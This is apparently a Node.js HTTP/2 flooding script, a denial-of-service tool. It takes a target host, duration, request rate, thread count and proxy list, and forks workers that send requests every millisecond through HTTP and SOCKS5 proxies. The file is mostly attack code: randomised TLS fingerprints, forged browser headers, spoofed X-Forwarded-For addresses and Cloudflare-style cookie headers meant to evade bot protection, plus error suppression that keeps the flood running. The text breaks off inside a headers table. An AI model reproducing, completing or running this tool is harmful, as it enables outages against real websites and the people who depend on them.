const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'twitter.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];
clength = urihost[Math.floor(Math.random() * urihost.length)]
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}

 function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }
    const cplist = [
       "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt `); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 

 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }


 const lookupPromise = util.promisify(dns.lookup);
let val;
let isp;
let pro;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
    // Random t? 512MB d?n 2048MB
    const min = 1000;
    const max = 5222;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
if (cluster.isMaster) {
    console.clear();
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.blue + process.argv[2].white);
    console.log(`Time: `.blue + process.argv[3].white);
    console.log(`Rate: `.blue + process.argv[4].white);
    console.log(`Thread: `.blue + process.argv[5].white);
    console.log(`ProxyFile: `.blue + process.argv[6].white);
    console.log(`--------------------------------------------`.gray);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
} else {
    setInterval(runFlooder, 1); // Gi? s? runFlooder du?c d?nh nghia v� g?i m?i gi�y
}
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  maxi = getRandomNumber(2,3)
    for (let i = 1; i <=maxi ; i++) {
      
      
  
   const key = 'cf-sec-'+ generateRandomString(1,9)
  
      const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
  
      doiTuong[key] = value;
    }
  
    return doiTuong;
  }
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};
const generateHeaders = (browser) => {
    const versions = {
    chrome: { min: 115, max: 125 },
    safari: { min: 14, max: 17 },
    brave: { min: 115, max: 125 },
    firefox: { min: 100, max: 115 },
    mobile: { min: 95, max: 115 },
    opera: { min: 85, max: 105 },
    operagx: { min: 85, max: 105 },
    duckduckgo: { min: 12, max: 17 }
};

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
    brave: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
    chrome: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
    firefox: `${Math.floor(100 + Math.random() * 20)}.0`,
    safari: `${Math.floor(14 + Math.random() * 4)}.${Math.floor(0 + Math.random() * 2)}.${Math.floor(Math.random() * 100)}`,
    mobile: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
    opera: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
    operagx: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
    duckduckgo: `7.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 100)}`
};

    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
    chrome: Math.random() < 0.5 ? "Win64" : Math.random() < 0.5 ? "Win32" : "Linux",
    safari: Math.random() < 0.5 ? "macOS" : Math.random() < 0.5 ? "iOS" : "iPadOS",
    brave: Math.random() < 0.5 ? "Linux" : Math.random() < 0.5 ? "Win64" : "macOS",
    firefox: Math.random() < 0.5 ? "Linux" : Math.random() < 0.5 ? "Win64" : "macOS",
    mobile: Math.random() < 0.5 ? "Android" : Math.random() < 0.5 ? "iOS" : "Windows Phone",
    opera: Math.random() < 0.5 ? "Linux" : Math.random() < 0.5 ? "Win64" : "macOS",
    operagx: Math.random() < 0.5 ? "Linux" : Math.random() < 0.5 ? "Win64" : "macOS",
    duckduckgo: Math.random() < 0.5 ? "macOS" : Math.random() < 0.5 ? "Windows" : "Linux"
};
    const platform = platforms[browser];

    const userAgents = {
    chrome: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36`,
    
    firefox: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64; rv:${Math.floor(100 + Math.random() * 20)}.0) Gecko/20100101 Firefox/${Math.floor(100 + Math.random() * 20)}.${Math.floor(Math.random() * 50)}.0`,
    
    safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(13 + Math.random() * 4)}_${Math.floor(Math.random() * 4)}) AppleWebKit/605.1.${Math.floor(10 + Math.random() * 5)} (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 4)}.0 Safari/605.1.${Math.floor(Math.random() * 5)}`,
    
    opera: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 5)}`,
    
    operagx: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 5)} (Edition GX)`,
    
    brave: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36 Brave/${Math.floor(1 + Math.random() * 4)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 500)}.${Math.floor(Math.random() * 5)}`,
    
    mobile: `Mozilla/5.0 (Linux; Android ${Math.floor(11 + Math.random() * 4)}; ${Math.random() < 0.5 ? "Mobile" : "Tablet"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Mobile Safari/537.36`,
    
    duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(13 + Math.random() * 4)}_${Math.floor(Math.random() * 4)}) AppleWebKit/605.1.${Math.floor(10 + Math.random() * 5)} (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 4)}.0 DuckDuckGo/7 Safari/605.1.${Math.floor(Math.random() * 5)}`
};
    const secFetchUser = Math.random() < 0.75 ? "?1;?1" : "?1";
const secChUaMobile = browser === "mobile" ? "?1" : "?0";
const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
const accept = Math.random() < 0.5 
  ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
  : "application/json";

const secChUaPlatform = ["Windows", "Linux", "macOS"][Math.floor(Math.random() * 3)];
const secChUaFull = Math.random() < 0.5 
  ? `"Google Chrome";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`
  : `"Mozilla Firefox";v="${Math.floor(115 + Math.random() * 10)}"`;

const secFetchDest = ["document", "image", "empty", "frame"][Math.floor(Math.random() * 4)];
const secFetchMode = ["navigate", "cors", "no-cors"][Math.floor(Math.random() * 3)];
const secFetchSite = ["same-origin", "same-site", "cross-site", "none"][Math.floor(Math.random() * 4)];

const acceptLanguage = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "es-ES,es;q=0.8,en;q=0.7", "fr-FR,fr;q=0.8", "id-ID,id;q=0.9"][Math.floor(Math.random() * 5)];

const acceptCharset = Math.random() < 0.5 ? "UTF-8" : "ISO-8859-1";
const connection = Math.random() < 0.5 ? "keep-alive" : "close";
const xRequestedWith = Math.random() < 0.5 ? "XMLHttpRequest" : "Fetch";
const referer = ["https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/", "https://www.reddit.com/", "https://twitter.com/"][Math.floor(Math.random() * 5)];

const xForwardedFor = Math.random() < 0.5 
  ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
  : `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`;

const te = Math.random() < 0.5 ? "trailers" : "gzip";
const cacheControl = Math.random() < 0.5 ? "no-cache" : "max-age=3600";

function getRandomPath() {
    const paths = [
        "/about", "/products", "/contact", "/news", "/services",
        "/blog/post-" + Math.floor(Math.random() * 1000), 
        "/article/" + Math.floor(Math.random() * 1000),
        "/category/" + Math.floor(Math.random() * 10),
        "/shop/product-" + Math.floor(Math.random() * 500),
        "/portfolio", "/faq", "/support",
        "/store/item-" + Math.floor(Math.random() * 1000),
        "/events/" + Math.floor(Math.random() * 200)
    ];
    return paths[Math.floor(Math.random() * paths.length)];
}

const headersMap = {
    brave: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 
        ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
        : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
    
    "sec-ch-ua": `"Brave";v="${Math.floor(99 + Math.random() * 6)}", "Chromium";v="${Math.floor(119 + Math.random() * 6)}"`,
    "sec-ch-ua-mobile": "?0", // Brave hanya tersedia untuk desktop
    "sec-ch-ua-platform": "Windows",
    "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,

    "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(99 + Math.random() * 6)}.0.0.0`,

    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
    "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",

    "referer": [
        "https://www.google.com/", "https://store.steampowered.com/", "https://www.epicgames.com/", 
        "https://www.twitch.tv/", "https://discord.com/", "https://www.opera.com/gx",
        "https://www.youtube.com/", "https://twitter.com/", "https://www.instagram.com/"
    ][Math.floor(Math.random() * 9)],

    "origin": ["https://www.opera.com/gx", "https://discord.com", "https://store.steampowered.com", "https://www.twitch.tv"][Math.floor(Math.random() * 4)],

    "x-forwarded-for": Math.random() < 0.4 
        ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
        : `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",

    "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
},
    chrome: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 
        ? parsedTarget.host + (Math.random() < 0.4 ? "." : "") 
        : (Math.random() < 0.4 ? "www." : "") + parsedTarget.host + (Math.random() < 0.4 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),

    "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
    "sec-ch-ua-platform": ["Windows", "Android", "macOS", "Linux"][Math.floor(Math.random() * 4)],
    "sec-ch-ua-platform-version": ["10.0.0", "11.0.0", "12.0.0", "13.0.0", "14.0.0", "15.0.0"][Math.floor(Math.random() * 6)],

    "user-agent": Math.random() < 0.5 
        ? `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`
        : `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 5)}; ${Math.random() < 0.5 ? "Pixel" : "Samsung"} ${Math.floor(3 + Math.random() * 3)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Mobile Safari/537.36`,

    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
    "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8", "es-ES,es;q=0.8", "de-DE,de;q=0.7", "zh-CN,zh;q=0.8"][Math.floor(Math.random() * 6)],
    "accept-encoding": Math.random() < 0.5 
        ? "gzip, deflate, br, zstd" 
        : "gzip, deflate, br, lz4",

    "referer": [
        "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", 
        "https://www.facebook.com/", "https://twitter.com/", "https://news.ycombinator.com/",
        "https://reddit.com/", "https://www.linkedin.com/", "https://www.quora.com/",
        "https://www.medium.com/", "https://www.github.com/"
    ][Math.floor(Math.random() * 11)],

    "x-forwarded-for": Math.random() < 0.4 
        ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
        : `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`,

    "sec-fetch-dest": ["document", "image", "iframe", "script", "empty"][Math.floor(Math.random() * 5)],
    "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin"][Math.floor(Math.random() * 4)],
    "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"][Math.floor(Math.random() * 4)],

    "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
},
    safari: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 
        ? parsedTarget.host + (Math.random() < 0.3 ? "." : "") 
        : (Math.random() < 0.3 ? "www." : "") + parsedTarget.host + (Math.random() < 0.3 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
    
    "sec-ch-ua": `"AppleWebKit";v="${Math.floor(537 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
    "sec-ch-ua-platform": ["macOS", "iOS"][Math.floor(Math.random() * 2)],
    "sec-ch-ua-platform-version": ["14.0.0", "15.2.0", "16.6.1", "17.2.0"][Math.floor(Math.random() * 4)],

    "user-agent": Math.random() < 0.5 
        ? `Mozilla/5.0 (Macintosh; Intel Mac OS X ${["10_15_7", "13_0", "14_0"][Math.floor(Math.random() * 3)]}) AppleWebKit/${Math.floor(537 + Math.random() * 10)}.36 (KHTML, like Gecko) Version/${Math.floor(15 + Math.random() * 5)}.0 Safari/${Math.floor(537 + Math.random() * 10)}.36`
        : `Mozilla/5.0 (iPhone; CPU iPhone OS ${["16_6_1", "17_2"][Math.floor(Math.random() * 2)]} like Mac OS X) AppleWebKit/${Math.floor(537 + Math.random() * 10)}.36 (KHTML, like Gecko) Version/${Math.floor(15 + Math.random() * 5)}.0 Mobile/${Math.floor(1500 + Math.random() * 500)} Safari/${Math.floor(537 + Math.random() * 10)}.36`,

    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
    "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8"][Math.floor(Math.random() * 3)],
    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
    
    "referer": [
        "https://www.google.com/", "https://www.apple.com/", "https://www.bing.com/",
        "https://duckduckgo.com/", "https://twitter.com/", "https://developer.apple.com/",
        "https://support.apple.com/", "https://news.ycombinator.com/"
    ][Math.floor(Math.random() * 8)],

    "origin": ["https://www.apple.com", "https://support.apple.com", "https://developer.apple.com"][Math.floor(Math.random() * 3)],

    "x-forwarded-for": Math.random() < 0.5 
        ? `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}` 
        : `2001:0db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`,

    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": ["same-origin", "same-site", "cross-site"][Math.floor(Math.random() * 3)],

    "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
    "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
    "dnt": Math.random() < 0.5 ? "1" : "0",
},
    mobile: {
    ":method": "GET",
    ":authority": Math.random() < 0.5 
        ? parsedTarget.host + (Math.random() < 0.3 ? "." : "") 
        : (Math.random() < 0.3 ? "m." : "www.") + parsedTarget.host + (Math.random() < 0.3 ? "." : ""),
    ":scheme": "https",
    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),

    "sec-ch-ua": `"Chromium";v="${Math.floor(114 + Math.random() * 9)}", "Google Chrome";v="${Math.floor(114 + Math.random() * 9)}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "Android",
    "sec-ch-ua-platform-version": `"${Math.floor(10 + Math.random() * 4)}.0"`,

    "user-agent": Math.random() < 0.5 
        ? `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 4)}.0; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(114 + Math.random() * 9)}.0.${Math.floor(5000 + Math.random() * 4000)}.0 Mobile Safari/537.36`
        : `Mozilla/5.0 (Android ${Math.floor(10 + Math.random() * 4)}.0; Mobile; rv:${Math.floor(115 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(115 + Math.random() * 10)}.0`,

    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
